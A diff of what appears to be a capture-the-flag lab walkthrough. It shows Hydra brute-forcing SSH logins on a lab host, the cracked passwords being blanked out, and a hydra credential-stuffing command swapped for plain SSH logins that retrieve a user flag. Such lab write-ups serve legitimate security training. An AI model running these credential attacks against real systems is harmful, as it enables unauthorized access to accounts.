@@ -71,7 +71,7 @@ debug1: Will attempt key: /home/not-root/.ssh/id_xmss
 
 ```
 What we know:  
-- Authentication Methods: Publickey and Password  
+- SSH Authentication Methods: Publickey and Password  
 - Possible Naming Convention: j_davis = f_last
 
 What we have:  
@@ -128,20 +128,19 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 01:49:
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 119 login tries (l:17/p:7), ~8 tries per task
 [DATA] attacking ssh://10.10.43.128:22/
-[22][ssh] host: 10.10.43.128   login: j_moore   password: Unplanned8@Chair
-[22][ssh] host: 10.10.43.128   login: m_brown   password: resetMeAfter1Use!*
+[22][ssh] host: 10.10.43.128   login: j_moore   password: __________
+[22][ssh] host: 10.10.43.128   login: m_brown   password: __________
 1 of 1 target successfully completed, 2 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 01:50:07
 ```
-
-
-### Initial Foothold
-Executed a credential stuffing attack utilizing the identifed users, and breached passwords.
+Use the newly found credentials to gain your initial foothold, and get the userFlag.txt.
 ```bash
-hydra -L users.txt -P breachedCreds.txt $ip ssh
+ssh j_moore@$ip
+```
+```bash
+ssh m_brown@$ip
 ```
 
-SSH Password credentials identified: j_moore : somePassword123
 ---
 ---
 ## Lateral Movement (MITRE ATT&CK Outline)
